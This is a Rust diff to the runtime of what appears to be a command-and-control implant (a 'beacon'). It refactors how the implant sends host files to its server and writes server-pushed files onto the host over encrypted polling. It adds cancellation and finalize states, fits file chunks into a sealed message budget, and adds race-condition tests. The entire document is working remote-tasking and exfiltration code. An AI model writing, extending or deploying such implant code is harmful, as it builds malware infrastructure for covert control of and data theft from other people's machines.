@@ -15,6 +15,7 @@ use crate::download::Download;
 use crate::metadata;
 use crate::runner;
 use crate::transport::Transport;
+use crate::upload::Upload;
 
 /// What the implant is configured with before it knows its session id.
 #[derive(Clone, Debug)]
@@ -56,17 +57,65 @@ pub struct BeaconRuntime {
     accepted_task_ids: Mutex<VecDeque<Uuid>>,
     task_states: Mutex<HashMap<Uuid, ActiveTask>>,
     completed: Mutex<BoundedIds>,
-    download: RwLock<Option<Download>>,
-    upload: RwLock<Option<crate::upload::Upload>>,
-    terminal_upload: Mutex<Option<TerminalUpload>>,
+    download: RwLock<Option<ActiveDownload>>,
+    upload: RwLock<Option<ActiveUpload>>,
     stop: AtomicBool,
 }
 
-struct TerminalUpload {
-    ack: FileAck,
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum TransferPhase {
+    Active,
+    Finalizing,
+}
+
+struct ActiveUpload {
+    transfer: Option<Upload>,
+    cancelled: Arc<AtomicBool>,
+    completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
+    phase: TransferPhase,
     task_id: Uuid,
-    total: u64,
-    dest: String,
+}
+
+impl ActiveUpload {
+    fn new(transfer: Upload, completion: tokio::sync::oneshot::Sender<TaskResult>) -> Self {
+        let task_id = transfer.task_id();
+        Self {
+            transfer: Some(transfer),
+            cancelled: Arc::new(AtomicBool::new(false)),
+            completion: Some(completion),
+            phase: TransferPhase::Active,
+            task_id,
+        }
+    }
+
+    fn task_id(&self) -> Uuid {
+        self.task_id
+    }
+}
+
+struct ActiveDownload {
+    transfer: Option<Download>,
+    cancelled: Arc<AtomicBool>,
+    completion: Option<tokio::sync::oneshot::Sender<TaskResult>>,
+    phase: TransferPhase,
+    task_id: Uuid,
+}
+
+impl ActiveDownload {
+    fn new(transfer: Download, completion: tokio::sync::oneshot::Sender<TaskResult>) -> Self {
+        let task_id = transfer.task_id();
+        Self {
+            transfer: Some(transfer),
+            cancelled: Arc::new(AtomicBool::new(false)),
+            completion: Some(completion),
+            phase: TransferPhase::Active,
+            task_id,
+        }
+    }
+
+    fn task_id(&self) -> Uuid {
+        self.task_id
+    }
 }
 
 const TASK_ID_MEMORY_LIMIT: usize = 4096;
@@ -80,6 +129,7 @@ struct BoundedIds {
 enum ActiveTask {
     Accepted,
     Running(tokio::task::AbortHandle),
+    Completing,
     Cancelled,
 }
 
@@ -100,6 +150,99 @@ impl BoundedIds {
         }
         true
     }
+}
+
+fn cancelled_result(task_id: Uuid) -> TaskResult {
+    TaskResult {
+        task_id,
+        ok: false,
+        stdout: Vec::new(),
+        stderr: b"task cancelled".to_vec(),
+        exit_code: -1,
+    }
+}
+
+fn poll_request_envelope(
+    key: &[u8; crypto::KEY_LEN],
+    request_id: u64,
+    session_id: Uuid,
+    request: &PollRequest,
+) -> Result<Envelope, AnyError> {
+    let plaintext = serde_json::to_vec(request).map_err(|error| AnyError(error.to_string()))?;
+    let encrypted = crypto::encrypt(key, request_id, &plaintext)
+        .map_err(|error| AnyError(error.to_string()))?;
+    Ok(Envelope::new(
+        Kind::TaskResult,
+        request_id,
+        Some(session_id),
+        encrypted,
+    ))
+}
+
+fn poll_request_fits(
+    key: &[u8; crypto::KEY_LEN],
+    request_id: u64,
+    session_id: Uuid,
+    request: &PollRequest,
+    inner_budget: usize,
+) -> Result<bool, AnyError> {
+    Ok(poll_request_envelope(key, request_id, session_id, request)?
+        .seal(key)
+        .map_err(|error| AnyError(error.to_string()))?
+        .len()
+        <= inner_budget)
+}
+
+/// Reserve fixed results/acknowledgements first, then fit a contiguous file
+/// prefix against the actual bytes emitted by `Envelope::seal`.
+fn fit_poll_request_to_budget(
+    key: &[u8; crypto::KEY_LEN],
+    request_id: u64,
+    session_id: Uuid,
+    inner_budget: usize,
+    mut request: PollRequest,
+) -> Result<Envelope, AnyError> {
+    let chunks = std::mem::take(&mut request.file_chunks);
+    if !poll_request_fits(key, request_id, session_id, &request, inner_budget)? {
+        return Err(AnyError(
+            "poll request fixed payload exceeds sealed wire budget".into(),
+        ));
+    }
+
+    for chunk in chunks {
+        request.file_chunks.push(chunk.clone());
+        if poll_request_fits(key, request_id, session_id, &request, inner_budget)? {
+            continue;
+        }
+        request.file_chunks.pop();
+        if chunk.data.is_empty() {
+            break;
+        }
+
+        let mut low = 1usize;
+        let mut high = chunk.data.len();
+        let mut fitted = None;
+        while low <= high {
+            let midpoint = low + (high - low) / 2;
+            let mut truncated = chunk.clone();
+            truncated.data.truncate(midpoint);
+            request.file_chunks.push(truncated.clone());
+            let fits = poll_request_fits(key, request_id, session_id, &request, inner_budget)?;
+            request.file_chunks.pop();
+            if fits {
+                fitted = Some(truncated);
+                low = midpoint + 1;
+            } else {
+                high = midpoint - 1;
+            }
+        }
+        if let Some(chunk) = fitted {
+            request.file_chunks.push(chunk);
+        }
+        break;
+    }
+
+    poll_request_envelope(key, request_id, session_id, &request)
 }
 
 impl BeaconRuntime {
@@ -131,7 +274,6 @@ impl BeaconRuntime {
             completed: Mutex::new(BoundedIds::default()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
-            terminal_upload: Mutex::new(None),
             stop: AtomicBool::new(false),
         }
     }
@@ -147,6 +289,53 @@ impl BeaconRuntime {
     /// Force-kill an in-flight task by task id. Returns true if a child was
     /// terminated. The awaiting runner turns the killed child into a result.
     pub async fn kill_task(&self, task_id: &Uuid) -> bool {
+        {
+            let mut slot = self.upload.write().unwrap();
+            if slot
+                .as_ref()
+                .is_some_and(|active| active.task_id() == *task_id)
+            {
+                let active = slot.as_mut().unwrap();
+                active.cancelled.store(true, Ordering::SeqCst);
+                if active.phase == TransferPhase::Active {
+                    let mut active = slot.take().unwrap();
+                    self.task_states
+                        .lock()
+                        .unwrap()
+                        .insert(*task_id, ActiveTask::Completing);
+                    if let Some(upload) = active.transfer.take() {
+                        let _ = upload.cancel();
+                    }
+                    if let Some(completion) = active.completion.take() {
+                        let _ = completion.send(cancelled_result(*task_id));
+                    }
+                }
+                return true;
+            }
+        }
+        {
+            let mut slot = self.download.write().unwrap();
+            if slot
+                .as_ref()
+                .is_some_and(|active| active.task_id() == *task_id)
+            {
+                let active = slot.as_mut().unwrap();
+                active.cancelled.store(true, Ordering::SeqCst);
+                if active.phase == TransferPhase::Active {
+                    let mut active = slot.take().unwrap();
+                    self.task_states
+                        .lock()
+                        .unwrap()
+                        .insert(*task_id, ActiveTask::Completing);
+                    active.transfer.take();
+                    if let Some(completion) = active.completion.take() {
+                        let _ = completion.send(cancelled_result(*task_id));
+                    }
+                }
+                return true;
+            }
+        }
+
         let mut states = self.task_states.lock().unwrap();
         let killed = match states.get(task_id) {
             Some(ActiveTask::Running(handle)) => {
@@ -158,34 +347,10 @@ impl BeaconRuntime {
                 states.insert(*task_id, ActiveTask::Cancelled);
                 true
             }
+            Some(ActiveTask::Completing) => false,
             None => false,
         };
         drop(states);
-        if killed {
-            let mut download = self.download.write().unwrap();
-            if download
-                .as_ref()
-                .is_some_and(|candidate| candidate.task_id() == *task_id)
-            {
-                *download = None;
-            }
-            drop(download);
-            let mut upload = self.upload.write().unwrap();
-            if upload
-                .as_ref()
-                .is_some_and(|candidate| candidate.task_id() == *task_id)
-            {
-                *upload = None;
-            }
-            drop(upload);
-            let mut terminal = self.terminal_upload.lock().unwrap();
-            if terminal
-                .as_ref()
-                .is_some_and(|candidate| candidate.task_id == *task_id)
-            {
-                *terminal = None;
-            }
-        }
         killed
     }
 
@@ -307,23 +472,25 @@ impl BeaconRuntime {
             let budget = self.transport.read().unwrap().inner_budget();
             let mut dl = self.download.write().unwrap();
             match dl.as_mut() {
-                Some(d) => {
+                Some(active) => {
                     // Wait for the completion ack before reporting done.
-                    d.step(budget)
+                    active
+                        .transfer
+                        .as_mut()
+                        .map(|download| download.step(budget))
+                        .unwrap_or_default()
                 }
                 None => Vec::new(),
             }
         };
 
         // Acks for the server->implant upload (reflect last-reply write state).
-        let upload_acks = if let Some(terminal) = self.terminal_upload.lock().unwrap().as_ref() {
-            vec![terminal.ack]
-        } else {
+        let upload_acks = {
             let up = self.upload.read().unwrap();
-            match up.as_ref() {
-                Some(u) => vec![u.ack()],
-                None => Vec::new(),
-            }
+            up.as_ref()
+                .and_then(|active| active.transfer.as_ref())
+                .map(|upload| vec![upload.ack()])
+                .unwrap_or_default()
         };
         let inner_budget = self.transport.read().unwrap().inner_budget();
 
@@ -335,10 +502,7 @@ impl BeaconRuntime {
             upload_acks,
             inner_budget,
         };
-        let pt = serde_json::to_vec(&req).map_err(|e| AnyError(e.to_string()))?;
-        let ct =
-            crypto::encrypt(&self.session_key(), id, &pt).map_err(|e| AnyError(e.to_string()))?;
-        let env = Envelope::new(Kind::TaskResult, id, Some(sid), ct);
+        let env = fit_poll_request_to_budget(&self.session_key(), id, sid, inner_budget, req)?;
         let reply = self.exchange(&env).await?;
         let pt = crypto::decrypt(&self.session_key(), reply.id, &reply.encrypted)
             .map_err(|e| AnyError(e.to_string()))?;
@@ -361,117 +525,74 @@ impl BeaconRuntime {
 
         // Apply resume acks and finalize the completed download.
         for ack in pr.acks {
-            let mut dl = self.download.write().unwrap();
-            if let Some(d) = dl.as_mut() {
-                if ack.transfer_id == Some(d.transfer_id()) && !ack.done {
-                    d.resume_to(ack.received);
-                } else if ack.transfer_id == Some(d.transfer_id()) && ack.done {
-                    self.pending.lock().unwrap().push(TaskResult {
-                        task_id: d.task_id(),
-                        ok: true,
-                        stdout: format!("downloaded {} bytes of {}", ack.received, d.size)
-                            .into_bytes(),
-                        stderr: Vec::new(),
-                        exit_code: 0,
-                    });
-                    *dl = None;
-                }
-            }
-            let confirmed = self
-                .terminal_upload
-                .lock()
+            let download_matches = self
+                .download
+                .read()
                 .unwrap()
                 .as_ref()
-                .is_some_and(|terminal| {
-                    ack.transfer_id == terminal.ack.transfer_id
-                        && ack.done
-                        && ack.received == terminal.total
+                .is_some_and(|active| {
+                    active
+                        .transfer
+                        .as_ref()
+                        .is_some_and(|download| ack.transfer_id == Some(download.transfer_id()))
                 });
-            if confirmed {
-                let terminal = self.terminal_upload.lock().unwrap().take().unwrap();
-                if let Some(upload) = self.upload.write().unwrap().take() {
-                    if let Err(error) = upload.finalize() {
-                        self.pending.lock().unwrap().push(TaskResult {
-                            task_id: terminal.task_id,
-                            ok: false,
-                            stdout: Vec::new(),
-                            stderr: error.into_bytes(),
-                            exit_code: -1,
-                        });
-                        continue;
-                    }
-                }
-                self.pending.lock().unwrap().push(TaskResult {
-                    task_id: terminal.task_id,
-                    ok: true,
-                    stdout: format!("uploaded {} bytes to {}", terminal.total, terminal.dest)
-                        .into_bytes(),
-                    stderr: Vec::new(),
-                    exit_code: 0,
-                });
-            } else if ack.done {
-                let mut upload = self.upload.write().unwrap();
-                if upload
-                    .as_ref()
-                    .is_some_and(|candidate| ack.transfer_id == Some(candidate.transfer_id()))
+            if download_matches && ack.done {
+                self.finalize_download(ack).await;
+            } else if download_matches {
+                if let Some(download) = self
+                    .download
+                    .write()
+                    .unwrap()
+                    .as_mut()
+                    .and_then(|active| active.transfer.as_mut())
                 {
-                    let upload = upload.take().unwrap();
-                    let task_id = upload.task_id();
-                    let total = ack.received;
-                    let dest = upload.dest.clone();
-                    match upload.finalize() {
-                        Ok(()) => self.pending.lock().unwrap().push(TaskResult {
-                            task_id,
-                            ok: true,
-                            stdout: format!("uploaded {total} bytes to {dest}").into_bytes(),
-                            stderr: Vec::new(),
-                            exit_code: 0,
-                        }),
-                        Err(error) => self.pending.lock().unwrap().push(TaskResult {
-                            task_id,
-                            ok: false,
-                            stdout: Vec::new(),
-                            stderr: error.into_bytes(),
-                            exit_code: -1,
-                        }),
-                    }
+                    download.resume_to(ack.received);
                 }
+            }
+
+            let upload_matches = self.upload.read().unwrap().as_ref().is_some_and(|active| {
+                active
+                    .transfer
+                    .as_ref()
+                    .is_some_and(|upload| ack.transfer_id == Some(upload.transfer_id()))
+            });
+            if upload_matches && ack.done {
+                self.finalize_upload(ack).await;
             }
         }
 
         // Write any server->implant upload chunks; finalize when fully received.
         if !pr.push_chunks.is_empty() {
             let mut up = self.upload.write().unwrap();
-            let mut done_meta: Option<(FileAck, Uuid, u64, String)> = None;
-            if let Some(u) = up.as_mut() {
+            let mut failure: Option<(Uuid, String)> = None;
+            if let Some(active) = up.as_mut()
+                && let Some(u) = active.transfer.as_mut()
+            {
                 for chunk in &pr.push_chunks {
                     match u.write_chunk(chunk) {
-                        Ok(ack) if ack.done => {
-                            done_meta = Some((ack, u.task_id(), ack.total, u.dest.clone()));
-                            break;
-                        }
                         Ok(_) => {}
                         Err(error) => {
-                            self.pending.lock().unwrap().push(TaskResult {
-                                task_id: u.task_id(),
-                                ok: false,
-                                stdout: Vec::new(),
-                                stderr: error.into_bytes(),
-                                exit_code: -1,
-                            });
-                            *up = None;
+                            failure = Some((u.task_id(), error));
                             break;
                         }
                     }
                 }
             }
-            if let Some((ack, tid, total, dest)) = done_meta {
-                *self.terminal_upload.lock().unwrap() = Some(TerminalUpload {
-                    ack,
-                    task_id: tid,
-                    total,
-                    dest,
-                });
+            if let Some((task_id, error)) = failure {
+                let mut active = up.take().unwrap();
+                self.task_states
+                    .lock()
+                    .unwrap()
+                    .insert(task_id, ActiveTask::Completing);
+                if let Some(completion) = active.completion.take() {
+                    let _ = completion.send(TaskResult {
+                        task_id,
+                        ok: false,
+                        stdout: Vec::new(),
+                        stderr: error.into_bytes(),
+                        exit_code: -1,
+                    });
+                }
             }
         }
         let mut accepted_now = Vec::new();
@@ -505,7 +626,7 @@ impl BeaconRuntime {
                     self.completed.lock().unwrap().insert(task_id);
                     continue;
                 }
-                Some(ActiveTask::Running(_)) => continue,
+                Some(ActiveTask::Running(_) | ActiveTask::Completing) => continue,
                 Some(ActiveTask::Accepted) => {}
                 None if states.len() < TASK_ID_MEMORY_LIMIT => {
                     states.insert(task_id, ActiveTask::Accepted);
@@ -605,7 +726,7 @@ impl BeaconRuntime {
                         });
                         return;
                     };
-                    let transfer_started = {
+                    let completion = {
                         let mut slot = self.download.write().unwrap();
                         if slot.is_some() {
                             self.pending.lock().unwrap().push(TaskResult {
@@ -615,12 +736,13 @@ impl BeaconRuntime {
                                 stderr: b"a download is already in progress".to_vec(),
                                 exit_code: -1,
                             });
-                            false
+                            None
                         } else {
                             match Download::open(path, transfer_id, task.id) {
                                 Ok(d) => {
-                                    *slot = Some(d);
-                                    true
+                                    let (sender, receiver) = tokio::sync::oneshot::channel();
+                                    *slot = Some(ActiveDownload::new(d, sender));
+                                    Some(receiver)
                                 }
                                 Err(e) => {
                                     self.pending.lock().unwrap().push(TaskResult {
@@ -630,13 +752,15 @@ impl BeaconRuntime {
                                         stderr: e.into_bytes(),
                                         exit_code: -1,
                                     });
-                                    false
+                                    None
                                 }
                             }
                         }
                     };
-                    if transfer_started {
-                        self.wait_for_download(task.id).await;
+                    if let Some(completion) = completion
+                        && let Ok(result) = completion.await
+                    {
+                        self.pending.lock().unwrap().push(result);
                     }
                 }
                 _ => self.pending.lock().unwrap().push(TaskResult {
@@ -662,7 +786,7 @@ impl BeaconRuntime {
                         });
                         return;
                     };
-                    let transfer_started = {
+                    let completion = {
                         let mut slot = self.upload.write().unwrap();
                         if slot.is_some() {
                             self.pending.lock().unwrap().push(TaskResult {
@@ -672,7 +796,7 @@ impl BeaconRuntime {
                                 stderr: b"an upload is already in progress".to_vec(),
                                 exit_code: -1,
                             });
-                            false
+                            None
                         } else {
                             let expected_total =
                                 task.args.get(2).and_then(|value| value.parse().ok());
@@ -684,8 +808,9 @@ impl BeaconRuntime {
                                 task.args.get(3).filter(|value| !value.is_empty()).cloned(),
                             ) {
                                 Ok(u) => {
-                                    *slot = Some(u);
-                                    true
+                                    let (sender, receiver) = tokio::sync::oneshot::channel();
+                                    *slot = Some(ActiveUpload::new(u, sender));
+                                    Some(receiver)
                                 }
                                 Err(e) => {
                                     self.pending.lock().unwrap().push(TaskResult {
@@ -695,13 +820,15 @@ impl BeaconRuntime {
                                         stderr: e.into_bytes(),
                                         exit_code: -1,
                                     });
-                                    false
+                                    None
                                 }
                             }
                         }
                     };
-                    if transfer_started {
-                        self.wait_for_upload(task.id).await;
+                    if let Some(completion) = completion
+                        && let Ok(result) = completion.await
+                    {
+                        self.pending.lock().unwrap().push(result);
                     }
                 }
                 _ => self.pending.lock().unwrap().push(TaskResult {
@@ -845,33 +972,115 @@ impl BeaconRuntime {
         self.pending.lock().unwrap().push(result);
     }
 
-    async fn wait_for_download(&self, task_id: Uuid) {
-        loop {
-            let active = self
-                .download
-                .read()
-                .unwrap()
-                .as_ref()
-                .is_some_and(|download| download.task_id() == task_id);
-            if !active {
+    async fn finalize_upload(&self, ack: FileAck) {
+        let Some((upload, cancelled, task_id, destination)) = ({
+            let mut slot = self.upload.write().unwrap();
+            let Some(active) = slot.as_mut() else {
+                return;
+            };
+            if active.phase != TransferPhase::Active
+                || !active
+                    .transfer
+                    .as_ref()
+                    .is_some_and(|upload| ack.transfer_id == Some(upload.transfer_id()))
+            {
                 return;
             }
-            tokio::time::sleep(Duration::from_millis(20)).await;
+            active.phase = TransferPhase::Finalizing;
+            let upload = active.transfer.take().unwrap();
+            let task_id = active.task_id;
+            let destination = upload.dest.clone();
+            Some((upload, Arc::clone(&active.cancelled), task_id, destination))
+        }) else {
+            return;
+        };
+
+        let outcome = upload.finalize_with_cancellation(&cancelled);
+        let result = match outcome {
+            Ok(()) => TaskResult {
+                task_id,
+                ok: true,
+                stdout: format!("uploaded {} bytes to {destination}", ack.received).into_bytes(),
+                stderr: Vec::new(),
+                exit_code: 0,
+            },
+            Err(_error) if cancelled.load(Ordering::SeqCst) => cancelled_result(task_id),
+            Err(error) => TaskResult {
+                task_id,
+                ok: false,
+                stdout: Vec::new(),
+                stderr: error.into_bytes(),
+                exit_code: -1,
+            },
+        };
+        let mut slot = self.upload.write().unwrap();
+        if slot.as_ref().is_some_and(|active| {
+            active.task_id() == task_id && active.phase == TransferPhase::Finalizing
+        }) {
+            let mut active = slot.take().unwrap();
+            self.task_states
+                .lock()
+                .unwrap()
+                .insert(task_id, ActiveTask::Completing);
+            if let Some(completion) = active.completion.take() {
+                let _ = completion.send(result);
+            }
         }
     }
 
-    async fn wait_for_upload(&self, task_id: Uuid) {
-        loop {
-            let active = self
-                .upload
-                .read()
-                .unwrap()
-                .as_ref()
-                .is_some_and(|upload| upload.task_id() == task_id);
-            if !active {
+    async fn finalize_download(&self, ack: FileAck) {
+        let Some((download, cancelled, task_id, size)) = ({
+            let mut slot = self.download.write().unwrap();
+            let Some(active) = slot.as_mut() else {
+                return;
+            };
+            if active.phase != TransferPhase::Active
+                || !active
+                    .transfer
+                    .as_ref()
+                    .is_some_and(|download| ack.transfer_id == Some(download.transfer_id()))
+            {
                 return;
             }
-            tokio::time::sleep(Duration::from_millis(20)).await;
+            active.phase = TransferPhase::Finalizing;
+            let download = active.transfer.take().unwrap();
+            let task_id = active.task_id;
+            let size = download.size;
+            Some((download, Arc::clone(&active.cancelled), task_id, size))
+        }) else {
+            return;
+        };
+
+        let outcome = download.finalize_with_cancellation(&cancelled);
+        let result = match outcome {
+            Ok(()) => TaskResult {
+                task_id,
+                ok: true,
+                stdout: format!("downloaded {} bytes of {size}", ack.received).into_bytes(),
+                stderr: Vec::new(),
+                exit_code: 0,
+            },
+            Err(_error) if cancelled.load(Ordering::SeqCst) => cancelled_result(task_id),
+            Err(error) => TaskResult {
+                task_id,
+                ok: false,
+                stdout: Vec::new(),
+                stderr: error.into_bytes(),
+                exit_code: -1,
+            },
+        };
+        let mut slot = self.download.write().unwrap();
+        if slot.as_ref().is_some_and(|active| {
+            active.task_id() == task_id && active.phase == TransferPhase::Finalizing
+        }) {
+            let mut active = slot.take().unwrap();
+            self.task_states
+                .lock()
+                .unwrap()
+                .insert(task_id, ActiveTask::Completing);
+            if let Some(completion) = active.completion.take() {
+                let _ = completion.send(result);
+            }
         }
     }
 
@@ -1004,6 +1213,69 @@ mod tests {
             assert!(delay >= Duration::from_millis(100));
             assert!(delay < Duration::from_millis(150));
         }
+    }
+
+    #[test]
+    fn sealed_wire_request_truncates_one_download_chunk_and_makes_progress() {
+        let key = crypto::derive_key(b"request-budget", b"test");
+        let session_id = Uuid::new_v4();
+        let transfer_id = Uuid::new_v4();
+        let task_id = Uuid::new_v4();
+        let inner_budget = 1200;
+        let request = PollRequest {
+            file_chunks: vec![nw_profile::msgs::FileChunk {
+                transfer_id: Some(transfer_id),
+                task_id: Some(task_id),
+                name: "artifact.bin".into(),
+                offset: 17,
+                total: 4096,
+                data: vec![0x5a; 1024],
+            }],
+            inner_budget,
+            ..Default::default()
+        };
+
+        let envelope =
+            fit_poll_request_to_budget(&key, 77, session_id, inner_budget, request).unwrap();
+        let sealed = envelope.seal(&key).unwrap();
+
+        assert!(
+            sealed.len() <= inner_budget,
+            "sealed request was {} bytes",
+            sealed.len()
+        );
+        let plaintext = crypto::decrypt(&key, envelope.id, &envelope.encrypted).unwrap();
+        let fitted: PollRequest = serde_json::from_slice(&plaintext).unwrap();
+        assert_eq!(fitted.file_chunks.len(), 1);
+        assert_eq!(fitted.file_chunks[0].offset, 17);
+        assert_eq!(fitted.file_chunks[0].total, 4096);
+        assert!(!fitted.file_chunks[0].data.is_empty());
+        assert!(fitted.file_chunks[0].data.len() < 1024);
+    }
+
+    #[test]
+    fn sealed_wire_request_rejects_fixed_payload_that_cannot_fit() {
+        let key = crypto::derive_key(b"request-fixed-budget", b"test");
+        let task_id = Uuid::new_v4();
+        let request = PollRequest {
+            results: vec![TaskResult {
+                task_id,
+                ok: true,
+                stdout: vec![0x41; 2048],
+                stderr: Vec::new(),
+                exit_code: 0,
+            }],
+            inner_budget: 1200,
+            ..Default::default()
+        };
+
+        let error =
+            fit_poll_request_to_budget(&key, 78, Uuid::new_v4(), 1200, request).unwrap_err();
+
+        assert_eq!(
+            error.0,
+            "poll request fixed payload exceeds sealed wire budget"
+        );
     }
 
     #[tokio::test]
@@ -1141,6 +1413,257 @@ mod tests {
         assert_eq!(result.stderr, b"task cancelled");
         let _ = std::fs::remove_file(&destination);
         let _ = std::fs::remove_file(format!("{}.nwpart-{}", destination.display(), task.args[1]));
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn kill_during_upload_finalize_yields_one_cancelled_result() {
+        use sha2::{Digest, Sha256};
+
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let destination = directory.path().join("published.bin");
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                destination.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+                "3".into(),
+                hex::encode(Sha256::digest(b"new")),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while runtime.upload.read().unwrap().is_none() {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .expect("upload slot installation");
+
+        let reached = Arc::new(std::sync::Barrier::new(2));
+        let release = Arc::new(std::sync::Barrier::new(2));
+        {
+            let mut slot = runtime.upload.write().unwrap();
+            let upload = slot
+                .as_mut()
+                .and_then(|active| active.transfer.as_mut())
+                .expect("active upload transfer");
+            upload
+                .write_chunk(&nw_profile::msgs::FileChunk {
+                    transfer_id: Some(transfer_id),
+                    task_id: Some(task.id),
+                    name: destination.to_string_lossy().into_owned(),
+                    offset: 0,
+                    total: 3,
+                    data: b"new".to_vec(),
+                })
+                .unwrap();
+            upload.set_finalize_barriers(Arc::clone(&reached), Arc::clone(&release));
+        }
+        let finalizer = {
+            let runtime = Arc::clone(&runtime);
+            tokio::spawn(async move {
+                runtime
+                    .finalize_upload(FileAck {
+                        transfer_id: Some(transfer_id),
+                        received: 3,
+                        total: 3,
+                        done: true,
+                    })
+                    .await;
+            })
+        };
+        tokio::task::spawn_blocking(move || reached.wait())
+            .await
+            .unwrap();
+
+        let kill = Task {
+            id: Uuid::new_v4(),
+            command: "nw/killtask".into(),
+            args: vec![task.id.to_string()],
+            timeout_ms: 10_000,
+        };
+        assert!(runtime.accept_task(kill.id));
+        Arc::clone(&runtime).execute(vec![kill.clone()]).await;
+        tokio::task::spawn_blocking(move || release.wait())
+            .await
+            .unwrap();
+        finalizer.await.unwrap();
+        runner.await.unwrap();
+
+        assert!(!destination.exists());
+        assert!(
+            !directory
+                .path()
+                .join(format!("published.bin.nwpart-{transfer_id}"))
+                .exists()
+        );
+        let results = runtime.pending.lock().unwrap();
+        let terminal = results
+            .iter()
+            .filter(|result| result.task_id == task.id)
+            .collect::<Vec<_>>();
+        assert_eq!(terminal.len(), 1);
+        assert!(!terminal[0].ok);
+        assert_eq!(terminal[0].stderr, b"task cancelled");
+        assert!(
+            !results
+                .iter()
+                .any(|result| result.task_id == task.id && result.ok)
+        );
+        drop(results);
+
+        let next = Task {
+            id: Uuid::new_v4(),
+            command: "nw/upload".into(),
+            args: vec![
+                directory
+                    .path()
+                    .join("next.bin")
+                    .to_string_lossy()
+                    .into_owned(),
+                Uuid::new_v4().to_string(),
+                "1".into(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(next.id));
+        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            loop {
+                if runtime
+                    .upload
+                    .read()
+                    .unwrap()
+                    .as_ref()
+                    .is_some_and(|active| active.task_id() == next.id)
+                {
+                    break;
+                }
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .expect("next upload FIFO slot");
+        assert!(runtime.kill_task(&next.id).await);
+        next_runner.await.unwrap();
+    }
+
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn kill_during_download_finalize_yields_one_cancelled_result() {
+        let runtime = Arc::new(runtime());
+        let directory = tempfile::tempdir().unwrap();
+        let source = directory.path().join("source.bin");
+        std::fs::write(&source, b"new").unwrap();
+        let transfer_id = Uuid::new_v4();
+        let task = Task {
+            id: Uuid::new_v4(),
+            command: "nw/download".into(),
+            args: vec![
+                source.to_string_lossy().into_owned(),
+                transfer_id.to_string(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(task.id));
+        let runner = tokio::spawn(Arc::clone(&runtime).execute(vec![task.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while runtime.download.read().unwrap().is_none() {
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .expect("download slot installation");
+
+        let reached = Arc::new(std::sync::Barrier::new(2));
+        let release = Arc::new(std::sync::Barrier::new(2));
+        runtime
+            .download
+            .write()
+            .unwrap()
+            .as_mut()
+            .and_then(|active| active.transfer.as_mut())
+            .unwrap()
+            .set_finalize_barriers(Arc::clone(&reached), Arc::clone(&release));
+        let finalizer = {
+            let runtime = Arc::clone(&runtime);
+            tokio::spawn(async move {
+                runtime
+                    .finalize_download(FileAck {
+                        transfer_id: Some(transfer_id),
+                        received: 3,
+                        total: 3,
+                        done: true,
+                    })
+                    .await;
+            })
+        };
+        tokio::task::spawn_blocking(move || reached.wait())
+            .await
+            .unwrap();
+
+        let kill = Task {
+            id: Uuid::new_v4(),
+            command: "nw/killtask".into(),
+            args: vec![task.id.to_string()],
+            timeout_ms: 10_000,
+        };
+        assert!(runtime.accept_task(kill.id));
+        Arc::clone(&runtime).execute(vec![kill]).await;
+        tokio::task::spawn_blocking(move || release.wait())
+            .await
+            .unwrap();
+        finalizer.await.unwrap();
+        runner.await.unwrap();
+
+        let results = runtime.pending.lock().unwrap();
+        let terminal = results
+            .iter()
+            .filter(|result| result.task_id == task.id)
+            .collect::<Vec<_>>();
+        assert_eq!(terminal.len(), 1);
+        assert!(!terminal[0].ok);
+        assert_eq!(terminal[0].stderr, b"task cancelled");
+        assert!(
+            !results
+                .iter()
+                .any(|result| result.task_id == task.id && result.ok)
+        );
+        drop(results);
+
+        let next = Task {
+            id: Uuid::new_v4(),
+            command: "nw/download".into(),
+            args: vec![
+                source.to_string_lossy().into_owned(),
+                Uuid::new_v4().to_string(),
+            ],
+            timeout_ms: 60_000,
+        };
+        assert!(runtime.accept_task(next.id));
+        let next_runner = tokio::spawn(Arc::clone(&runtime).execute(vec![next.clone()]));
+        tokio::time::timeout(Duration::from_secs(2), async {
+            loop {
+                if runtime
+                    .download
+                    .read()
+                    .unwrap()
+                    .as_ref()
+                    .is_some_and(|active| active.task_id() == next.id)
+                {
+                    break;
+                }
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .expect("next download FIFO slot");
+        assert!(runtime.kill_task(&next.id).await);
+        next_runner.await.unwrap();
     }
 
     #[test]
